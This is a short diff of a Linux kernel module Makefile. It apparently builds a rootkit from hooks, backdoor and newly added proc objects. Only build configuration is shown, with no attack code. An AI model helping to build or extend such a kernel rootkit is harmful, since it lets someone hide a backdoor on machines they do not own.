@@ -1,5 +1,5 @@
 obj-m += rootkit.o
-rootkit-objs := hooks.o backdoor.o
+rootkit-objs := hooks.o backdoor.o proc.o
 KDIR = /lib/modules/`uname -r`/build
 
 all: kbuild
